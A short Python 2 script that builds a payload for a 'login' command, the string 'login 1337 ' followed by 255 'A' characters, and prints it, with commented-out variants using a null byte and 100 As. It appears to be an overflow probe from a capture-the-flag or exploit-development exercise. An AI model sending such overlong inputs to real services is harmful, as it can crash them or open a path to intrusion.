payload = ""

payload += "login 1337 "
payload += 'A'*255
#payload += 'login 1337\x00'
#payload += 'A'*100

print payload
